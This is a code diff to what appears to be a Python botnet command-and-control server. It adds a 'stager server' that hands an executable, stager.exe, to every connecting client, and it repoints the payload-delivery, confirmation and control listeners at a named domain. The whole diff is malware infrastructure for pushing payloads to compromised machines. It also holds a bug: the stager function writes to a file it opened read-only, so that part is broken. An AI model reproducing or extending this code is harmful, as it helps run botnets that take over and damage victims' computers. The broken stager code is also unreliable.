@@ -33,7 +33,22 @@ def upload_file(file):
         botnet[bot].send("FILE".encode())
         pass #BETA
 
-def start_confirmation_server(ip="159.65.11.28",port=2000):
+def start_stager_server(ip="www.bolt2003.tk",port=1990):
+    global server_sockets
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.bind((ip,port))
+    s.listen(5)
+    file = open("/var/www/html/stager.exe",'rb')
+    data = file.read()
+    file.write(data)
+    file.close()
+    server_sockets.append(s)
+    while True:
+        c,a = s.accept()
+        c.send(data)
+        c.close()
+
+def start_confirmation_server(ip="www.bolt2003.tk",port=2000):
     global test_conns,server_sockets
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
@@ -50,7 +65,7 @@ def start_confirmation_server(ip="159.65.11.28",port=2000):
             continue
         test_conns[str(addr[0])] = client
 
-def start_payload_delivery_server(port=2004,ip="142.93.158.189"):
+def start_payload_delivery_server(port=2004,ip="www.bolt2003.tk"):
     global payload_name,server_sockets
     ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     ss.bind((ip,port))
@@ -79,7 +94,7 @@ def start_payload_delivery_server(port=2004,ip="142.93.158.189"):
         except Exception as ee:
             print("[*] An Unknown Error Occurred : %s"%(str(ee)))
 
-def start_server(port=2003,ip="159.65.11.28"):
+def start_server(port=2003,ip="www.bolt2003.tk"):
     global botnet,exec_command,on_connect_exit,server_sockets
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
